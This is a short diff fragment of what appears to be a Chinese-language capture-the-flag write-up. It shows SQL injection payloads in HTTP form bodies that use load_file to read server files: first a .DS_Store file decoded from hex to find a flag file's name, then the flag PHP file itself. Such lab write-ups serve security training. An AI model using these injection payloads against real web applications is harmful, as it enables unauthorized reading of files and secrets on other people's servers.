@@ -134,3 +134,7 @@ title=12&category=12',content=(select(hex(load_file("/tmp/html/.DS_Store")))),/*
 https://www.sojson.com/hexadecimal.html
 ![](assets/Day%206/file-20251224173111303.png)
 得到了flag的文件路径，`flag_8946e1ff1ee3e40f.php`
+```http
+title=12&category=12',content=(select(load_file("/var/www/html/flag_8946e1ff1ee3e40f.php"))),/*&content=123
+```
+![](assets/Day%206/file-20251224173652831.png)
